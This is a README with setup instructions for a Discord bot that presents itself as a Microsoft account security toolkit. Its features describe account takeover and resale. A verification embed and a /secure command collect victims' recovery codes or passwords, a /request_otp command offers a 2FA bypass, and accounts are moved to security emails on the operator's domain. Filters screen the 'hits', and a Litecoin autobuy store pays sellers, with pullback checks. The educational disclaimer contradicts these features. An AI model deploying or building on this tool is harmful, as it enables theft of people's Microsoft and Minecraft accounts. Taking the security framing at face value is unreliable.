# RomeoMSA — Microsoft Account Security Toolkit

Microsoft account securing automation for Discord. Request-based, headless — no Selenium or Playwright. Built-in SMTP server, web dashboard, and autobuy flow.

**Maintainer: [RomeoXLover](https://github.com/RomeoXLover)** — this is the authoritative fork. All active development, bug fixes, and feature work lives here.

---

## Disclaimer

Use at your own risk. Automating Microsoft account flows may violate Microsoft's Terms of Service. This software is for educational purposes. The maintainer and upstream authors are not responsible for account actions taken by Microsoft or third parties.

This repository is a cybersecurity project focused on Microsoft account security and automation. It contains scripts that explore ways to improve account protection, including setting up two-factor authentication (2FA) and checking for possible security issues.

The project was made mainly for learning and experimentation. It can be used by students, researchers, and people interested in cybersecurity to get a better idea of how account security works and how different security measures can help keep accounts and personal information safe.

---

## Project layout

| Directory | Purpose |
|-----------|---------|
| `authsecuring/` | Core MSA securing orchestration (`orch.py`), auth flows, security operations |
| `authsecuring/utils/` | Cookie handling, proxy transport, login, security information |
| `authsecuring/utils/security/` | 2FA, password, recovery, proof, alias, device operations |
| `authsecuring/utils/ogi/` | Microsoft OGI API wrappers (subscriptions, family, cards, contacts) |
| `commands/` | All Discord slash command cogs (replaces `cogs/`) |
| `views/` | Discord UI components — buttons and modals |
| `inbox/` | Built-in SMTP server + OTP detection + Discord forwarding |
| `store/` | LTC autobuy store — wallet, payouts, credits |
| `mc/` | Minecraft profile, SSID, capes, gamertag, name-change lookups |
| `tools/` | Shared utilities — TOTP, links, embeds, email, logging |
| `storage/` | SQLite database layer (`solis_db.py`) |
| `panel/` | React + TypeScript web dashboard |
| `config/` | `bot_settings.json` (runtime) + `runtime.json` (commands/embeds/presence) |
| `logs/` | Application log files |
| `database/*.db` | SQLite database files (auto-created) |

---

## Table of contents

- [Requirements](#requirements)
- [Setup (step by step)](#setup-step-by-step)
- [Configuration reference](#configuration-reference)
- [Email & DNS](#-email--dns)
- [Running with PM2](#running-with-pm2)
- [Web dashboard](#web-dashboard)
- [Bot commands](#bot-commands)
- [Troubleshooting](#troubleshooting)

---

## Requirements

| Dependency | Version | Purpose |
|------------|---------|---------|
| Python | 3.12+ | Bot, API, securing logic, SMTP |
| Node.js | 20+ (22 recommended for web build) | Dashboard frontend |
| PM2 | latest | Process manager (`npm i -g pm2`) |
| Port 25 | open (inbound) | SMTP for security emails |
| Domain + DNS | MX + A for mail | Deliver Microsoft OTPs to your host |

---

## Setup (step by step)

### 1. Clone

```bash
git clone https://github.com/RomeoXLover/romeo-open-source-autosecure.git
cd romeo-open-source-autosecure
```

### 2. Create configs from examples

```bash
cp config/config.json.example config/config.json
cp config/bot.json.example config/bot.json          # if missing
cp cloudflared.yml.example cloudflared.yml         # optional tunnel
cp ecosystem.config.cjs.example ecosystem.config.cjs  # optional; repo may already ship one
```

**Never commit** `config/config.json` (gitignored). It holds the bot token, webhooks, proxies, and wallet keys.

### 3. Discord bot

1. Open [Discord Developer Portal](https://discord.com/developers/applications) → **New Application** → **Bot**
2. Enable **all Privileged Gateway Intents**
3. OAuth2 → URL Generator: scopes `bot` + `applications.commands` → invite to your server
4. Copy the bot token into `config/config.json` → `tokens.bot_token`
5. Put your Discord user ID in `owners` (Developer Mode → Copy User ID)

### 4. Fill `config/config.json` (minimum)

| Field | What to set |
|-------|-------------|
| `owners` | Your Discord snowflake ID(s) |
| `tokens.bot_token` | Discord bot token |
| `domain` | Domain that receives security mail (must match MX) |
| `web.credentials.username` | Dashboard login user |
| `web.credentials.password` | Long random password (not the example placeholder) |
| `web.credentials.jwt_secret` | Long random string / 64 hex chars |
| `mail.discord_webhook_all` | Webhook for every inbound mail (optional but useful) |
| `mail.discord_webhook_otp` | Webhook when an OTP is detected |
| `discord.*_channel` | Channel IDs for logs / accounts / censored logs |

Optional later: `proxy` / `coldproxy`, Skytools/Donut API keys, autobuy + LTC wallet, OTP bridge URLs.

### 5. DNS for mail (required for securing)

In Cloudflare (or your DNS), **DNS only** (grey cloud) for mail:

| Type | Name | Value |
|------|------|-------|
| A | `mail` | Your VPS public IP |
| MX | `@` | `mail.yourdomain.com` (priority 10) |

Open **TCP 25** inbound on the VPS firewall. Only one process should listen on port 25 (`romeo-bot`).

### 6. Install & build

```bash
# Python
python3.12 -m venv .venv          # or python3
.venv/bin/pip install -r requirements.txt

# Web dashboard
cd panel && npm install && npm run build && cd ..
```

Or one-shot:

```bash
chmod +x setup.sh
./setup.sh
# edit config/config.json, then run ./setup.sh again
```

### 7. Start with PM2

```bash
pm2 start ecosystem.config.cjs
pm2 save
pm2 status
pm2 logs romeo-bot
```

| Process | Port | Role |
|---------|------|------|
| `romeo-bot` | 25 (SMTP) | Discord bot + mail |
| `romeo-api` | 8000 (localhost) | FastAPI |
| `romeo-web` | 3000 | Dashboard UI |

Dashboard: `http://YOUR_VPS_IP:3000` — log in with `web.credentials`.

### 8. Optional public HTTPS (Cloudflare Tunnel)

```bash
cp cloudflared.yml.example cloudflared.yml
# set tunnel id, credentials-file, hostname
cloudflared tunnel --config cloudflared.yml run
```

Update `CORS_ORIGINS` in `ecosystem.config.cjs` to include your public UI origin.

---

## Configuration reference

| Key | Description |
|-----|-------------|
| `domain` | Domain for auto-created security emails (`alias@yourdomain.com`) |
| `mail.discord_webhook_all` | Discord webhook for every incoming email |
| `mail.discord_webhook_otp` | Discord webhook when an OTP is detected |
| `mail.otp_bridge_url` / `otp_bridge_urls` | Optional HTTP OTP bridge (e.g. playtime / treefarm) |
| `web.credentials` | Dashboard login + JWT secret |
| `proxy.proxies` | List of `host:port:user:pass` (or disable with `enabled: false`) |
| `coldproxy.*` | Optional Coldproxy residential package |
| `autosecure.reject.*` | Family / Game Pass / age / ban / phone / NFA-name filters |
| `autosecure.reject.gamepass` | Rejects **active** Game Pass only |
| `autobuy.pending_hours` | Default seller credit hold (hours) |
| `autobuy.client_plus_*` | Shorter hold for Client+ Discord role |
| `autobuy.security_email_check_interval_hours` | Pullback / security-email check during pending grace |
| `autobuy.hold_check_interval_hours` | First Microsoft lock check after sell |
| `autobuy.hold_check_second_interval_hours` | Second lock check delay after the first |
| `autobuy.ltc_wallet` | Litecoin payout wallet (`wif` / `address`) — keep private |

### `config/bot.json`

Command toggles, aliases, embed templates, button labels, presence, and post-verification behavior. No secrets. Prefer editing via the dashboard **Bot Config** tab when possible.

### API keys (optional)

| Service | URL | Used for |
|---------|-----|----------|
| Skytools | [developer.skytools.app](https://developer.skytools.app/) | Hypixel / SkyBlock stats |
| DonutSMP | [api.donutsmp.net](https://api.donutsmp.net/index.html) | Donut stats |

---

## Email & DNS

The bot runs an SMTP server on **port 25** when `romeo-bot` starts. Mail is stored in SQLite and forwarded to Discord webhooks.

### Cloudflare DNS (DNS only / grey cloud)

| Type | Name | Value |
|------|------|-------|
| A | `mail` | Your VPS public IP |
| MX | `@` | `mail.yourdomain.com` (priority 10) |

Only one process should bind port 25 on the VPS (this bot — not a separate instance).

---

## Running with PM2

`ecosystem.config.cjs` starts three processes:

| Process | Port | Role |
|---------|------|------|
| `romeo-bot` | 25 (SMTP) | Discord bot + mail server |
| `romeo-api` | 8000 | FastAPI backend |
| `romeo-web` | 3000 | Dashboard (Nitro build) |

```bash
pm2 start ecosystem.config.cjs
pm2 logs romeo-bot
pm2 restart romeo-bot romeo-api romeo-web
```

Update `CORS_ORIGINS` in `ecosystem.config.cjs` if you access the dashboard from a public IP or domain.

### Public access (optional)

Use Cloudflare Tunnel or nginx in front of ports 3000/8000. See `cloudflared.yml` if you use a tunnel.

---

## Web dashboard

Default: `http://YOUR_VPS_IP:3000` (Nitro binds `0.0.0.0:3000`; API stays on `127.0.0.1:8000` and is proxied).

```bash
cp config/config.json.example config/config.json
# Set web.credentials.username / password / jwt_secret to values that are NOT the example placeholders
```

Login uses `web.credentials` in your local `config/config.json` (gitignored). **Enable 2FA** under Settings — the example password is a placeholder only and must be changed before going live.

| Tab | Description |
|-----|-------------|
| Overview | Stats and recent accounts |
| Accounts | Browse, search, view details, **delete** accounts |
| Secure | Manual / bulk securing |
| Emails | Security inboxes |
| Bot Config | Channels, commands, embeds |
| Settings | Dashboard password / 2FA |

---

## Bot commands

Command names can be renamed in `config/bot.json` or the dashboard.

| Command | Description |
|---------|-------------|
| `/secure` | Secure via recovery code or auth+password |
| `/check locked` | Check suspended / phone-locked status (admin) |
| `/email new` | Create `alias@domain` security email |
| `/email inbox` | View inbox for a security email |
| `/email list` | List stored security emails |
| `/request_otp` | Request OTP / 2FA bypass flow |
| `/auth code` | TOTP from 2FA secret |
| `/set channel` | Set logs / hits channels |
| `/send embed` | Send verification embed |
| `/stats hypixel` / `/stats donut` | Minecraft stats (needs API keys) |

---

## Troubleshooting

| Problem | What to check |
|---------|----------------|
| Bot won't start | Python 3.12+, venv deps, valid `bot_token`, intents enabled |
| Port 25 in use | Stop other SMTP; only one listener |
| Emails not arriving | DNS A/MX, port 25 open, `domain` in config matches MX domain |
| Wrong failure message on locked account | Lock detection runs before secure |
| Rejected for Game Pass but GP expired | Filter matches product title + active cycle only |
| Secure stuck / false "No Minecraft" on CatB | Security email must receive OTP; bot completes Verify → remind LooksGood |
| Autobuy credits stuck pending | Check `hold_check_enabled` and intervals; Client+ role shortens hold |
| Dashboard login fails | `web.credentials` in `config/config.json` |
| `git push` goes to wrong host | `git remote set-url origin https://github.com/RomeoXLover/romeo-open-source-autosecure.git` |
| Web build fails on Node 20 | Run `node node_modules/vite/bin/vite.js build` inside `panel/` |
